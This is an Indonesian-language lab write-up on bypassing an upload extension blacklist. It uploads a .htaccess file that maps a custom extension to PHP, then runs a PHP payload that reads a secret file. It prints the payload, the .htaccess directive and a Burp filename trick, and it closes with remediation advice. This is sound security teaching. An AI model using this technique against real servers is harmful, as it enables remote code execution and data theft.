# Lab: Web Shell Upload via Extension Blacklist Bypass

## 1. Executive Summary
Terjadi kerentanan **Unrestricted File Upload via Blacklist Bypass** pada fungsi pengunggahan foto profil. Aplikasi web menerapkan mekanisme keamanan berbasis *blacklist* untuk memblokir ekstensi skrip populer (seperti `.php`). Namun, web server (Apache) mengizinkan pengunggahan berkas konfigurasi `.htaccess`. Penyerang dapat mengunggah berkas `.htaccess` kustom untuk memetakan ekstensi acak (misal: `.abc`) sebagai skrip PHP executable, sehingga berhasil mengeksekusi **Remote Code Execution (RCE)**.

---

## 2. Vulnerability Details
| Parameter | Detail |
| :--- | :--- |
| **Vulnerability Type** | Blacklist Bypass / Arbitrary File Upload |
| **Severity** | Critical |
| **Target Web Server** | Apache HTTP Server (`.htaccess` support enabled) |
| **Impact** | Remote Code Execution (RCE) & Server Compromise |

---

## 3. Proof of Concept (Steps to Reproduce)

1. **Reconnaissance & Blacklist Verification:**
   * Login ke aplikasi dan coba unggah berkas `exploit.php`.
   * Server menolak pengunggahan, mengonfirmasi adanya mekanisme filter berbasis *blacklist* pada ekstensi `.php`.

2. **Persiapan Payload:**
   * Buat berkas skrip PHP bernama `exploit.abc`:
     ```php
     <?php
     echo file_get_contents('/home/carlos/secret');
     ?>
     ```
   * Buat berkas konfigurasi `.htaccess` lokal untuk memetakan ekstensi `.abc` ke MIME-type PHP:
     ```apache
     AddType application/x-httpd-php .abc
     ```

3. **Eksploitasi (Override Web Server Configuration):**
   * Unggah berkas `.htaccess` melalui form foto profil. (Jika nama berkas terpotong saat diunggah, cegat request di **Burp Suite** dan ubah parameter `filename="htaccess"` menjadi `filename=".htaccess"`).
   * Setelah konfigurasi `.htaccess` berhasil terpasang di server, unggah berkas `exploit.abc`.

4. **Eksekusi Kode (RCE):**
   * Akses URL berkas yang baru diunggah (misal: `/files/avatars/exploit.abc`).
   * Web server Apache akan memproses `.abc` sebagai skrip PHP dan mengeksekusi perintah untuk membaca berkas `/home/carlos/secret`.

---

## 4. Remediation & Recommendation
* **Gunakan Whitelisting (Bukan Blacklist):** Terapkan pendekatan *strict extension whitelisting* yang hanya mengizinkan ekstensi gambar valid (misal: `.jpg`, `.jpeg`, `.png`). Tolak semua ekstensi lainnya secara *default*.
* **Disable Overrides (`AllowOverride None`):** Konfigurasikan server Apache agar tidak memproses berkas `.htaccess` pada folder publik/upload dengan mengatur direktori:
  ```apache
  <Directory "/var/www/uploads">
      AllowOverride None
  </Directory>
